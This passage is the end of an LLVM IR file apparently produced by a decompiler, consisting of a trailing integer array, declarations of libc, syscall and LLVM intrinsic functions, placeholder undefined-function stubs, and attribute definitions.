246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 393, 394, 488, 489, 492, 493, 494, 495, 513, 514, 515, 516 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @wait4(i32, i32, i32, %rusage*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i64 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare i8 @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare %rusage* @__decompiler_undefined_function_10() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_11() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
